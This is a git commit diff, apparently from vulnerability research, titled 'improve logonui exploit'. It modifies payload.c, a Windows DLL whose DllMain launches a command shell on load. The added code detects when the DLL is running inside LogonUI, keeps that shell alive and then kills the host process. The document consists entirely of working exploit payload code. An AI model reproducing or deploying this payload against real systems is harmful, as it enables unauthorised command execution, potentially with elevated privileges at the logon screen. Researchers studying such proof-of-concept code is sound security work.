1de22b02f0a004cd8a90fba8ea90e643bbe0ce77
Tavis Ormandy <taviso@gmail.com>
2019-06-26 16:23:17 -0700

    improve logonui exploit

--- payload.c
+++ payload.c
@@ -5,18 +5,34 @@
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 {
     CHAR Command[] = "cmd";
+    CHAR ModulePath[MAX_PATH];
+    CHAR ModuleName[MAX_PATH];
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
 
     ZeroMemory(&si, sizeof(si));
     ZeroMemory(&pi, sizeof(pi));
+    ZeroMemory(&ModulePath, sizeof(ModulePath));
+    ZeroMemory(&ModuleName, sizeof(ModuleName));
     si.cb = sizeof si;
+
+    // Learn what process we've loaded into, in case we need it.
+    if (GetModuleFileNameA(NULL, ModulePath, sizeof ModulePath)) {
+        _splitpath(ModulePath, NULL, NULL, ModuleName, NULL);
+    }
 
     switch (fdwReason)
     {
         case DLL_PROCESS_ATTACH:
             // attach to process
             if (CreateProcess(NULL, Command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+
+                // LogonUI acts strangely if we try to ExitProcess()
+                if (stricmp(ModuleName, "LOGONUI") == 0) {
+                    WaitForSingleObject(pi.hProcess, INFINITE);
+                    TerminateProcess(GetCurrentProcess(), 0);
+                }
+
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
             } else {
